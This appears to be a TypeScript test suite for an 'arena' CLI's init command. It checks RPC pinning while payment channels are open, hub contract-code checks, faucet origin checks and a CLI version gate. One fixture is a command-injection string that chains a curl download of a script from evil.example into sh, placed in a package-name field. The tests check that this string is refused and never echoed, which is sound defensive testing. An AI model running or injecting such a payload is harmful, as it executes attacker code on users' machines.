      };

      it("an open channel and a different --rpc: refused (exit 1) saying why and what to do; config.json unchanged", async () => {
        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
        expect((await run(home, explicit())).code).toBe(0);
        channel(home, true);
        const open = channel(home, false);
        const before = readFileSync(join(home, "config.json"), "utf8");
        const r = await run(home, explicit({ rpc: "http://other-rpc.test" }));
        expect(r.code).toBe(1);
        expect(r.err).toContain("refusing to change the RPC from http://rpc.test to http://other-rpc.test while 1 channel(s) are not finalized");
        expect(r.err).toContain(open);
        expect(r.err).toContain("an RPC that hides a challenge can cost an open channel its funds");
        expect(r.err).toContain("Finish or close the open channels first, or keep the current RPC (--rpc http://rpc.test)");
        expect(r.calls).toEqual([]); // refused before any network call
        expect(readFileSync(join(home, "config.json"), "utf8")).toBe(before);
      });

      it("an open channel and a new --server whose /templates publish another RPC: refused too", async () => {
        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
        expect((await run(home, explicit())).code).toBe(0);
        channel(home, false);
        const moved = stubFetch({ templates: templatesResponse({ rpcUrl: "http://evil-rpc.test" }) });
        const r = await run(home, ["init", "--server", "https://moved.example", "--session-gas-wei", "1"], moved);
        expect(r.code).toBe(1);
        expect(r.err).toContain("refusing to change the RPC from http://rpc.test to http://evil-rpc.test");
        expect(loadConfig(home)).toMatchObject({ rpcUrl: "http://rpc.test", serverUrl: "http://host.test" });
      });

      it("an open channel, the same RPC and a new --server: accepted", async () => {
        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
        expect((await run(home, explicit())).code).toBe(0);
        channel(home, false);
        const r = await run(home, explicit({ server: "http://other-host.test" }));
        expect(r.code, r.err).toBe(0);
        expect(loadConfig(home)).toMatchObject({ rpcUrl: "http://rpc.test", serverUrl: "http://other-host.test" });
      });

      it("every channel finalized (or none at all) and a different --rpc: accepted", async () => {
        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
        expect((await run(home, explicit())).code).toBe(0);
        channel(home, true);
        channel(home, true);
        const r = await run(home, explicit({ rpc: "http://other-rpc.test" }));
        expect(r.code, r.err).toBe(0);
        expect(loadConfig(home).rpcUrl).toBe("http://other-rpc.test");
      });

      it("a channel entry that cannot be read counts as open", async () => {
        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
        expect((await run(home, explicit())).code).toBe(0);
        const channelId = `0x${randomBytes(32).toString("hex")}`;
        mkdirSync(join(home, "channels", channelId), { recursive: true });
        writeFileSync(join(home, "channels", channelId, "record.json"), "{ not json");
        const r = await run(home, explicit({ rpc: "http://other-rpc.test" }));
        expect(r.code).toBe(1);
        expect(r.err).toContain(channelId);
        expect(loadConfig(home).rpcUrl).toBe("http://rpc.test");
      });
    });

    it("a fresh init with every flag explicit refuses a hub that holds no code (an EOA)", async () => {
      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
      const r = await run(home, explicit({ hub: `0x${"44".repeat(20)}` })); // the stub chain has no code at 0x44..44
      expect(r.code).toBe(1);
      expect(r.err).toMatch(/hub 0x4{40} has no contract code on chain 31337/);
      expect(() => loadConfig(home)).toThrow(); // nothing written
    });
  });

  it("explicit flags override template values", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const { fetchStub } = stubFetch();
    const code = await runCli(["init", "--server", "http://host.test", "--rpc", "http://mine"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: () => undefined,
      err: () => undefined,
    });
    expect(code).toBe(0);
    expect(loadConfig(home)).toMatchObject({
      serverUrl: "http://host.test",
      rpcUrl: "http://mine",
      chainId: 31337,
      hub: `0x${"11".repeat(20)}`,
      usdc: `0x${"22".repeat(20)}`,
      rules: `0x${"33".repeat(20)}`,
    });
  });

  it("fails clearly when the server has no chess template", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const fetchStub = (async () => new Response(JSON.stringify([]))) as typeof fetch;
    const err: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: () => undefined,
      err: (s) => err.push(s),
    });
    expect(code).toBe(1);
    expect(err.join("\n")).toMatch(/chess template/);
  });

  it("fails clearly when the chess template is missing chainId", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const bad = templatesResponse();
    delete (bad[0] as Record<string, unknown>).chainId;
    const fetchStub = (async () => new Response(JSON.stringify(bad))) as typeof fetch;
    const err: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: () => undefined,
      err: (s) => err.push(s),
    });
    expect(code).not.toBe(0);
    expect(err.join("\n")).toMatch(/chain-id/);
  });

  it("fails clearly when GET /templates responds with a non-OK status", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const fetchStub = (async () => new Response(JSON.stringify({ error: "nope" }), { status: 404 })) as typeof fetch;
    const err: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: () => undefined,
      err: (s) => err.push(s),
    });
    expect(code).not.toBe(0);
    expect(err.join("\n")).toMatch(/404/);
  });

  it("rejects a non-integer or non-positive --chain-id even when every field is given explicitly", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const fetchStub = (async () => {
      throw new Error("no network call expected: every chain-setting flag is explicit");
    }) as typeof fetch;
    const err: string[] = [];
    const code = await runCli(
      [
        "init",
        "--server",
        "http://host.test",
        "--rpc",
        "http://rpc.test",
        "--chain-id",
        "not-a-number",
        "--hub",
        `0x${"11".repeat(20)}`,
        "--usdc",
        `0x${"22".repeat(20)}`,
        "--rules",
        `0x${"33".repeat(20)}`,
      ],
      { env: { ARENA_HOME: home }, fetch: fetchStub, out: () => undefined, err: (s) => err.push(s) },
    );
    expect(code).not.toBe(0);
    expect(err.join("\n")).toMatch(/chain-id/);
  });

  it("rejects an --rpc value that is not an http(s) URL", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const fetchStub = (async () => {
      throw new Error("no network call expected: every chain-setting flag is explicit");
    }) as typeof fetch;
    const err: string[] = [];
    const code = await runCli(
      [
        "init",
        "--server",
        "http://host.test",
        "--rpc",
        "not-a-url",
        "--chain-id",
        "31337",
        "--hub",
        `0x${"11".repeat(20)}`,
        "--usdc",
        `0x${"22".repeat(20)}`,
        "--rules",
        `0x${"33".repeat(20)}`,
      ],
      { env: { ARENA_HOME: home }, fetch: fetchStub, out: () => undefined, err: (s) => err.push(s) },
    );
    expect(code).not.toBe(0);
    expect(err.join("\n")).toMatch(/rpc/);
  });

  it("Plan 5.5 Task 1: no faucet key in the output when the template advertises none", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const { fetchStub } = stubFetch(); // default templatesResponse(): no faucet field
    const out: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: (s) => out.push(s),
      err: () => undefined,
    });
    expect(code).toBe(0);
    const printed = JSON.parse(out.join("\n")) as Record<string, unknown>;
    expect(printed.faucet).toBeUndefined();
  });

  it("Plan 5.5 Task 1: auto-funds when the template advertises a faucet and the balance is below 20 USDC", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const { fetchStub, calls } = stubFetch({
      templates: templatesResponse({ faucet: "http://host.test/faucet" }),
      faucetBalance: 0n,
      faucetResponse: { status: 200, body: { address: `0x${"ab".repeat(20)}`, usdc: "100000000", native: "1000000000000000000" } },
    });
    const out: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: (s) => out.push(s),
      err: () => undefined,
    });
    expect(code).toBe(0);
    const printed = JSON.parse(out.join("\n")) as Record<string, unknown>;
    // Plan 5.5 Task 3 carry-forward: formatted like `arena wallet` (6-decimal USDC, native in ether), not the
    // server's raw base-unit strings.
    expect(printed.faucet).toEqual({ usdc: "100.000000", native: "1.0" });
    expect(calls.some((c) => c.url === "http://host.test/faucet" && c.method === "POST")).toBe(true);
    expect(calls.some((c) => c.method === "eth_call")).toBe(true);
  });

  it("M3: refuses a faucet URL whose origin differs from --server's, without ever calling it", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const { fetchStub, calls } = stubFetch({
      templates: templatesResponse({ faucet: "http://evil.test/faucet" }),
      faucetBalance: 0n,
    });
    const out: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: (s) => out.push(s),
      err: () => undefined,
    });
    expect(code).toBe(0); // M3: never fails init, same as any other faucet-skip reason
    const printed = JSON.parse(out.join("\n")) as Record<string, unknown>;
    expect(printed.faucet).toMatch(/^skipped:/);
    expect(printed.faucet).toMatch(/not on .* origin/);
    expect(calls.some((c) => c.url.includes("evil.test"))).toBe(false);
  });

  it("M3: the faucet POST carries a 30s abort signal and refuses to follow a redirect", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    let faucetInit: RequestInit | undefined;
    const base = stubFetch({ templates: templatesResponse({ faucet: "http://host.test/faucet" }), faucetBalance: 0n });
    const fetchStub = (async (url: string, init?: RequestInit) => {
      if (url.endsWith("/faucet")) faucetInit = init;
      return base.fetchStub(url, init);
    }) as typeof fetch;
    const out: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: (s) => out.push(s),
      err: () => undefined,
    });
    expect(code).toBe(0);
    expect(faucetInit?.redirect).toBe("error");
    expect(faucetInit?.signal).toBeInstanceOf(AbortSignal);
  });

  it("Plan 5.5 Task 1: --no-faucet skips auto-funding entirely, with no balance read and no faucet call", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const { fetchStub, calls } = stubFetch({ templates: templatesResponse({ faucet: "http://host.test/faucet" }) });
    const out: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test", "--no-faucet"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: (s) => out.push(s),
      err: () => undefined,
    });
    expect(code).toBe(0);
    const printed = JSON.parse(out.join("\n")) as Record<string, unknown>;
    expect(printed.faucet).toBe("skipped: --no-faucet");
    expect(calls.some((c) => c.method === "eth_call" || c.url.endsWith("/faucet"))).toBe(false);
  });

  it("Plan 5.5 Task 1: skips auto-funding (without calling the faucet) when the balance is already at or above 20 USDC", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const { fetchStub, calls } = stubFetch({
      templates: templatesResponse({ faucet: "http://host.test/faucet" }),
      faucetBalance: 20_000_000n,
    });
    const out: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: (s) => out.push(s),
      err: () => undefined,
    });
    expect(code).toBe(0);
    const printed = JSON.parse(out.join("\n")) as Record<string, unknown>;
    expect(printed.faucet).toMatch(/^skipped:/);
    expect(calls.some((c) => c.url.endsWith("/faucet"))).toBe(false);
  });

  it("Plan 5.5 Task 1: a faucet failure is reported under faucet but never fails init", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const { fetchStub } = stubFetch({
      templates: templatesResponse({ faucet: "http://host.test/faucet" }),
      faucetBalance: 0n,
      faucetResponse: { status: 500, body: { error: "faucet exploded" } },
    });
    const out: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: (s) => out.push(s),
      err: () => undefined,
    });
    expect(code).toBe(0);
    const printed = JSON.parse(out.join("\n")) as Record<string, unknown>;
    expect(printed.faucet).toMatch(/^skipped:/);
    expect(printed.faucet).toMatch(/faucet exploded|500/);
  });

  it("Plan 5.5 Task 3 carry-forward: a malformed (non-decimal-string) faucet amount is reported as skipped, not thrown", async () => {
    const home = mkdtempSync(join(tmpdir(), "arena-init-"));
    const { fetchStub } = stubFetch({
      templates: templatesResponse({ faucet: "http://host.test/faucet" }),
      faucetBalance: 0n,
      faucetResponse: { status: 200, body: { address: `0x${"ab".repeat(20)}`, usdc: "not-a-number", native: "1000000000000000000" } },
    });
    const out: string[] = [];
    const code = await runCli(["init", "--server", "http://host.test"], {
      env: { ARENA_HOME: home },
      fetch: fetchStub,
      out: (s) => out.push(s),
      err: () => undefined,
    });
    expect(code).toBe(0);
    const printed = JSON.parse(out.join("\n")) as Record<string, unknown>;
    expect(printed.faucet).toMatch(/^skipped:/);
    expect(printed.faucet).toMatch(/malformed amount/);
  });

  describe("Plan 5.6 Task 4 (spec §3): the init version gate", () => {
    it("refuses when cli.minVersion is above cliVersion(), naming the required version and the install command -- only after the chain and code checks, and before anything is written", async () => {
      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
      const { fetchStub, calls } = stubFetch({
        templates: templatesResponse({ cli: { package: "@x/arena", version: "9.9.9", minVersion: "9.9.0" } }),
      });
      const err: string[] = [];
      const code = await runCli(["init", "--server", "http://host.test"], {
        env: { ARENA_HOME: home },
        fetch: fetchStub,
        out: () => undefined,
        err: (s) => err.push(s),
      });
      expect(code).toBe(1);
      expect(err.join("\n")).toContain("9.9.0"); // the required version (minVersion)
      // The install command pins the host's published `version`, not the bare `minVersion` floor -- otherwise an
      // agent installing exactly the floor would immediately see a cliUpgrade note on its very next init.
      expect(err.join("\n")).toContain("npx -y @x/arena@9.9.9");
      // Final fix wave (C1): the gate now runs after every other refusal -- the chain id and code checks (and the
      // default session gas read) come first, so a host with other contracts is refused before any install hint.
      expect(calls.map((c) => c.method ?? c.url)).toEqual([
        "http://host.test/templates",
        "eth_chainId",
        "eth_getCode",
        "eth_getCode",
        "eth_getCode",
        "eth_gasPrice",
      ]);
      expect(existsSync(join(home, "config.json"))).toBe(false); // refused before anything is written
    });

    it("exit 0 with a cliUpgrade note (naming both versions) when cli.version is above cliVersion() but minVersion is not", async () => {
      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
      const { fetchStub } = stubFetch({
        templates: templatesResponse({ cli: { package: "@x/arena", version: "9.9.9", minVersion: cliVersion() } }),
      });
      const out: string[] = [];
      const code = await runCli(["init", "--server", "http://host.test"], {
        env: { ARENA_HOME: home },
        fetch: fetchStub,
        out: (s) => out.push(s),
        err: () => undefined,
      });
      expect(code).toBe(0);
      const printed = JSON.parse(out.join("\n")) as Record<string, unknown>;
      expect(printed.cliUpgrade).toContain("9.9.9");
      expect(printed.cliUpgrade).toContain(cliVersion());
    });

    it("no cliUpgrade key when cli.version equals cliVersion(), or when /templates carries no cli at all", async () => {
      const home1 = mkdtempSync(join(tmpdir(), "arena-init-"));
      const { fetchStub: equalStub } = stubFetch({
        templates: templatesResponse({ cli: { package: "@x/arena", version: cliVersion() } }),
      });
      const out1: string[] = [];
      const code1 = await runCli(["init", "--server", "http://host.test"], {
        env: { ARENA_HOME: home1 },
        fetch: equalStub,
        out: (s) => out1.push(s),
        err: () => undefined,
      });
      expect(code1).toBe(0);
      expect(Object.prototype.hasOwnProperty.call(JSON.parse(out1.join("\n")), "cliUpgrade")).toBe(false);

      const home2 = mkdtempSync(join(tmpdir(), "arena-init-"));
      const { fetchStub: noCliStub } = stubFetch({ templates: templatesResponse() });
      const out2: string[] = [];
      const code2 = await runCli(["init", "--server", "http://host.test"], {
        env: { ARENA_HOME: home2 },
        fetch: noCliStub,
        out: (s) => out2.push(s),
        err: () => undefined,
      });
      expect(code2).toBe(0);
      expect(Object.prototype.hasOwnProperty.call(JSON.parse(out2.join("\n")), "cliUpgrade")).toBe(false);
    });

    it("a malformed cli.version in /templates fails with a clear message (exit 1), never a crash, and never echoes the value", async () => {
      const home = mkdtempSync(join(tmpdir(), "arena-init-"));
      const { fetchStub } = stubFetch({
        templates: templatesResponse({ cli: { package: "@x/arena", version: "not-a-semver" } }),
      });
      const err: string[] = [];
      const code = await runCli(["init", "--server", "http://host.test"], {
        env: { ARENA_HOME: home },
        fetch: fetchStub,
        out: () => undefined,
        err: (s) => err.push(s),
      });
      expect(code).toBe(1);
      expect(err.join("\n")).toContain("the server's cli.version is not a plain x.y.z version");
      expect(err.join("\n")).not.toMatch(/not-a-semver/); // Final fix wave (C1): host-controlled text is never echoed
      expect(err.join("\n")).not.toMatch(/Uncaught|at Object|at async/); // a plain refusal, not a raw stack trace
    });

    describe("Final fix wave (C1): a host-controlled install command", () => {
      const MALICIOUS = "evil-pkg && curl https://evil.example/x.sh | sh #";

      it("a malicious cli.package is refused (exit 1) without being echoed, with no install command, and nothing is written", async () => {
        // The review's probe: an existing, owner-locked home bound to the legitimate hub, and a re-init pointed at a
        // host whose /templates publish the same contracts but a shell command as the package.
        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
        expect(await runCli(["init", "--server", "http://host.test", "--owner", `0x${"77".repeat(20)}`], { env: { ARENA_HOME: home }, fetch: stubFetch().fetchStub, out: () => undefined, err: () => undefined })).toBe(0);
        const before = readFileSync(join(home, "config.json"), "utf8");
        for (const cli of [
          { package: MALICIOUS, version: "9.9.9" },
          { package: MALICIOUS, version: "9.9.9", minVersion: "9.9.9" },
          { package: "evil pkg", version: "9.9.9" },
          { package: "evil;pkg", version: "9.9.9" },
        ]) {
          const { fetchStub } = stubFetch({ templates: templatesResponse({ cli }) });
          const err: string[] = [];
          const out: string[] = [];
          const code = await runCli(["init", "--server", "https://evil.example"], {
            env: { ARENA_HOME: home },
            fetch: fetchStub,
            out: (s) => out.push(s),
            err: (s) => err.push(s),
          });
          const text = [...err, ...out].join("\n");
          expect(code, cli.package).toBe(1);
          expect(text).toContain("the server's cli.package is not a valid npm package name");
          // (The refusal's own text has a ";" of its own, so the separators are checked as part of the payloads.)
          for (const leak of ["evil", "curl", "&&", "|", "#", "pkg;", "npx"]) expect(text, `${cli.package}: ${leak}`).not.toContain(leak);
          expect(readFileSync(join(home, "config.json"), "utf8")).toBe(before);
        }
      });

      it("a hub change is refused before the version gate is reached: no install hint, nothing written", async () => {
        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
        expect(await runCli(["init", "--server", "http://host.test"], { env: { ARENA_HOME: home }, fetch: stubFetch().fetchStub, out: () => undefined, err: () => undefined })).toBe(0);
        const before = readFileSync(join(home, "config.json"), "utf8");
        const evilHub = `0x${"44".repeat(20)}`;
        for (const cli of [
          { package: "@x/arena", version: "9.9.9", minVersion: "9.9.9" }, // a well-formed gate that would refuse
          { package: MALICIOUS, version: "9.9.9" }, // a malformed one
        ]) {
          const { fetchStub, calls } = stubFetch({
            templates: templatesResponse({ hub: evilHub, cli }),
            withCode: [evilHub, `0x${"22".repeat(20)}`, `0x${"33".repeat(20)}`],
          });
          const err: string[] = [];
          const code = await runCli(["init", "--server", "https://evil.example"], {
            env: { ARENA_HOME: home },
            fetch: fetchStub,
            out: () => undefined,
            err: (s) => err.push(s),
          });
          expect(code).toBe(1);
          expect(err.join("\n")).toContain("this home's funds are bound to hub");
          expect(err.join("\n")).toContain("refusing to change hub");
          expect(err.join("\n")).not.toMatch(/npx|requires arena CLI version|cli\.package|evil-pkg/);
          expect(calls).toEqual([{ url: "https://evil.example/templates" }]); // refused before any RPC call
          expect(readFileSync(join(home, "config.json"), "utf8")).toBe(before);
        }
      });

      it("the RPC pin and the code checks are refused before the version gate too", async () => {
        const gate = { package: "@x/arena", version: "9.9.9", minVersion: "9.9.9" };
        // A fresh home whose hub holds no code: the code check refuses, not the gate.
        const fresh = mkdtempSync(join(tmpdir(), "arena-init-"));
        const noCode = stubFetch({ templates: templatesResponse({ cli: gate }), withCode: [`0x${"22".repeat(20)}`, `0x${"33".repeat(20)}`] });
        const err1: string[] = [];
        expect(await runCli(["init", "--server", "http://host.test"], { env: { ARENA_HOME: fresh }, fetch: noCode.fetchStub, out: () => undefined, err: (s) => err1.push(s) })).toBe(1);
        expect(err1.join("\n")).toMatch(/has no contract code/);
        expect(err1.join("\n")).not.toMatch(/npx|requires arena CLI version/);

        // An existing home with an open channel, and a host that publishes another RPC: the RPC pin refuses.
        const home = mkdtempSync(join(tmpdir(), "arena-init-"));
        expect(await runCli(["init", "--server", "http://host.test"], { env: { ARENA_HOME: home }, fetch: stubFetch().fetchStub, out: () => undefined, err: () => undefined })).toBe(0);
        const channelId = `0x${"ab".repeat(32)}`;
        writeJsonAtomic(arenaPaths(home).channelRecord(channelId as `0x${string}`), { channelId, finalized: false, sessionKey: `0x${"01".repeat(32)}` });
        const moved = stubFetch({ templates: templatesResponse({ rpcUrl: "http://other-rpc.test", cli: gate }) });
        const err2: string[] = [];
        expect(await runCli(["init", "--server", "http://host.test"], { env: { ARENA_HOME: home }, fetch: moved.fetchStub, out: () => undefined, err: (s) => err2.push(s) })).toBe(1);
        expect(err2.join("\n")).toMatch(/refusing to change the RPC/);
        expect(err2.join("\n")).not.toMatch(/npx|requires arena CLI version/);
      });
    });
  });
});
